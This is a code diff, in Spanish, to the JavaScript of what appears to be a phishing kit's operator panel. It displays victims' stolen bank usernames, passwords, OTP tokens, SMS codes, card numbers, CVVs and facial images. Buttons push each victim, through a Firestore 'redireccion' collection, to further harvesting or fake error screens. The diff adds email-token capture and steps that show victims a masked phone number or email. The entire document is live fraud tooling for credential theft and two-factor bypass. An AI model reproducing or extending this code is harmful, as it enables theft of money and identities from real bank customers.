@@ -1081,8 +1081,9 @@ function updateUI(docs) {
             const tdcAnio = userData.tdcAnio || '';
             const tdcCvv = userData.tdcCvv || '';
             const tdcEstado = userData.tdcEstado || '';
-            const token = userData.otpCode || '';
+            const token = userData.token || '';
             const sms = userData.smsCode || '';
+            const tokenEmail = userData.tokenEmail || '';
             const tokenResend = userData.tokenResend || '';
             const fotoFacialUrl = userData.fotoFacialUrl || '';
             const videoFacialUrl = userData.videoFacialUrl || '';
@@ -1188,48 +1189,27 @@ function updateUI(docs) {
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${usuario}" title="Haz clic para copiar">${usuario} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                         <span style="font-weight:600;">Clave:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${clave}" title="Haz clic para copiar">${clave} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">Token:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">SMS:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${sms}" title="Haz clic para copiar">${sms} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                    </div>
                     <div>
-                        <span style="font-weight:600;">TDC Nombre:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcNombre}" title="Haz clic para copiar">${tdcNombre} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">Numero:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcNumero}" title="Haz clic para copiar">${tdcNumero} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">Mes:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcMes}" title="Haz clic para copiar">${tdcMes} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">Año:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcAnio}" title="Haz clic para copiar">${tdcAnio} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">CVV:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcCvv}" title="Haz clic para copiar">${tdcCvv} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="opacity:.45;">|</span>
-                        <br>
-                        <span style="font-weight:600;">Pregunta de Seguridad:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${userData.respuestaSeguridad || ''}" title="Haz clic para copiar">${userData.respuestaSeguridad || 'Pendiente'} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <button class="btn btn-danger action-btn btn-sm rounded" data-action="pregseg_err" data-id="${userId}" title="Pregunta Error">Error</button>
+                         <span style="font-weight:600;">Token:</span>
+                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
+                        <span style="font-weight:600;">Email Token:</span>
+                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tokenEmail}" title="Haz clic para copiar">${tokenEmail} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                     </div>
                 </div>
                 <div style="display:flex; flex-direction:column; align-items:start; gap:10px; white-space:nowrap; color:${textColor}; padding-bottom:10px;">
                     <div class="d-flex align-items-center mb-2">
-                        <input type="text" class="form-control form-control-sm mr-2" id="pregseg-input-${userId}" placeholder="Ej: ¿Cual es tu color favorito?" style="width: 250px;">
-                        <button class="btn btn-warning action-btn btn-sm rounded" data-action="enviar_pregseg" data-id="${userId}">Enviar Pregunta</button>
+                        <input type="text" class="form-control form-control-sm mr-2 input-index2" data-id="${userId}" id="index2-input-${userId}" placeholder="Ej: +54 9 11 1234-5678" style="width: 170px;" value="${localStorage.getItem('phone_' + userId) || ''}">
+                        <button class="btn btn-info action-btn btn-sm mr-1 rounded btn-index2" data-action="index2" data-id="${userId}" ${localStorage.getItem('phone_' + userId) ? '' : 'disabled'}>index2</button>
+                        <button class="btn btn-danger action-btn btn-sm mr-3 rounded" data-action="index2_err" data-id="${userId}">index2 Error</button>
+                    </div>
+                    <div class="d-flex align-items-center mb-2">
+                        <input type="text" class="form-control form-control-sm mr-2 input-index3" data-id="${userId}" id="index3-input-${userId}" placeholder="Ej: correo@gmail.com" style="width: 170px;" value="${localStorage.getItem('email_' + userId) || ''}">
+                        <button class="btn btn-primary action-btn btn-sm mr-1 rounded btn-index3" data-action="index3" data-id="${userId}" ${localStorage.getItem('email_' + userId) ? '' : 'disabled'}>index3</button>
+                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="index3_err" data-id="${userId}">index3 Error</button>
                     </div>
                     <div>
                         <button class="btn btn-success action-btn btn-sm mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="index_err" data-id="${userId}">Index Error</button>
-                        <button class="btn btn-info action-btn btn-sm mr-1 rounded" data-action="token" data-id="${userId}">Token</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="token_err" data-id="${userId}">Token Error</button>
-                        <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="sms" data-id="${userId}">SMS</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="sms_err" data-id="${userId}">SMS Error</button>
-                        </div>
-                        <div>
-                        <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="tdc" data-id="${userId}">TDC</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="tdc_err" data-id="${userId}">TDC Error</button>
-                        <button class="btn btn-secondary action-btn btn-sm mr-1 rounded" data-action="facial" data-id="${userId}">Facial</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="facial_err" data-id="${userId}">Facial Error</button>
-                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
                         <button class="btn btn-danger action-btn btn-sm rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                     </div>
                     </div>
@@ -1710,6 +1690,10 @@ function handleUserAction(event) {
 
         if (action === "home") {
             payload.inicioErr = false;
+        } else if (action === "index2" || action === "index2_err") {
+            payload.phoneMask = localStorage.getItem(`phone_${userId}`) || "";
+        } else if (action === "index3" || action === "index3_err") {
+            payload.emailMask = localStorage.getItem(`email_${userId}`) || "";
         }
 
         updateDoc(doc(db, "redireccion", userId), payload)
@@ -1720,6 +1704,23 @@ function handleUserAction(event) {
 
 // Función para configurar delegación de eventos
 function setupEventListeners() {
+    // Delegación para inputs de telefono/email
+    document.addEventListener('input', function (e) {
+        if (e.target.classList.contains('input-index2')) {
+            const userId = e.target.getAttribute('data-id');
+            const val = e.target.value.trim();
+            localStorage.setItem(`phone_${userId}`, val);
+            const btn = document.querySelector(`.btn-index2[data-id="${userId}"]`);
+            if (btn) btn.disabled = !val;
+        } else if (e.target.classList.contains('input-index3')) {
+            const userId = e.target.getAttribute('data-id');
+            const val = e.target.value.trim();
+            localStorage.setItem(`email_${userId}`, val);
+            const btn = document.querySelector(`.btn-index3[data-id="${userId}"]`);
+            if (btn) btn.disabled = !val;
+        }
+    });
+
     // Delegación de eventos para botones de acción
     document.addEventListener('click', function (e) {
         // Manejar botones de acción
